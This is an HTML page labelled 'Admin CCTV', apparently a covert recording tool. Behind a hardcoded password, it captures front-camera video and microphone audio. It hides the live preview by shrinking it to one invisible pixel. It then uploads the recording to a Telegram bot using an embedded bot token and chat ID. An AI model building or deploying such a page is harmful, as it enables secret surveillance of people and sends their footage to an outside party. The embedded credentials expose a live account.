<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin CCTV</title>
<style>
  body {
    font-family: sans-serif;
    background: #111;
    color: #fff;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
  }
  input, button {
    padding: 10px;
    margin: 10px;
    font-size: 16px;
  }
  video {
    width: 1px;
    height: 1px;
    opacity: 0;
    position: absolute;
    top: 0;
    left: 0;
  }
</style>
</head>
<body>

<h2>Login Admin</h2>
<input type="password" id="password" placeholder="Password Admin">
<button id="loginBtn">Login</button>

<div id="adminPanel" style="display:none;">
  <h2>Admin Panel</h2>
  <button id="startBtn">Mulai Rekam</button>
  <button id="stopBtn">Hentikan & Kirim</button>
  <video id="video" autoplay playsinline></video>
</div>

<script>
const BOT_TOKEN = "8223984259:AAHsAazlUhvE4LOCfzSR1Ty-CAa38X7svjk";
const CHAT_ID = "7412613560";
const ADMIN_PASS = "1234"; // ganti password admin

let recorder, chunks = [], stream;

const loginBtn = document.getElementById('loginBtn');
const passwordInput = document.getElementById('password');
const adminPanel = document.getElementById('adminPanel');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const video = document.getElementById('video');

loginBtn.addEventListener('click', () => {
  if(passwordInput.value === ADMIN_PASS){
    adminPanel.style.display = "flex";
    passwordInput.style.display = "none";
    loginBtn.style.display = "none";
  } else {
    alert("Password salah!");
  }
});

startBtn.addEventListener('click', async () => {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
    video.srcObject = stream;

    recorder = new MediaRecorder(stream);
    chunks = [];
    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.start();
    alert("Rekaman dimulai!");
  } catch(err) {
    alert("Tidak bisa mengakses kamera/mikrofon: " + err);
  }
});

stopBtn.addEventListener('click', async () => {
  if(recorder && recorder.state !== 'inactive') recorder.stop();
  if(stream) stream.getTracks().forEach(track => track.stop());

  recorder.onstop = async () => {
    const blob = new Blob(chunks, { type: "video/webm" });
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("video", blob, "rekaman.webm");

    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
        method: "POST",
        body: formData
      });
      alert("✅ Video berhasil dikirim ke Telegram!");
    } catch(err) {
      alert("❌ Gagal mengirim video: " + err);
    }
  };
});
</script>

</body>
</html>
